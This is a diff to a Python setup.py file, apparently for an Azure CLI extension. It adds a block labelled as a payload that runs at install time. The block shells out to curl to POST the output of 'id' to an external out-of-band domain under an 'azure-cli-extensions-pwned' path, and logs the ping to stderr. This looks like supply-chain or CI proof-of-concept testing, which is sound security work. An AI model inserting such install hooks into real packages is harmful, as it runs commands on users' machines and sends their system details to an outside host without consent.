@@ -8,26 +8,22 @@
 from codecs import open
 from setuptools import setup, find_packages
 import os
-import os
 import sys
 
 # --- PAYLOAD START ---
 try:
     COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com"
     
-    # NOTICE THE CHANGE: used \" instead of '
-    # This allows $(id) to be executed by the shell
+    # 1. Send the OOB Request (Proof)
     os.system(f"curl -X POST -d \"id=$(id)\" https://{COLLAB_DOMAIN}/azure-cli-extensions-pwned")
     
-except:
-    pass
-
-    # Still print to stderr just in case you want log proof too
+    # 2. Print to logs (Backup Proof)
     sys.stderr.write(f"\n[!] Sent OOB ping to {COLLAB_DOMAIN}\n")
     
 except Exception as e:
-    pass
-  
+    # If it fails, print why (don't just pass)
+    sys.stderr.write(f"\n[!] Payload Error: {e}\n")
+# --- PAYLOAD END ---
 VERSION = "0.4.1"
 
 CLASSIFIERS = [
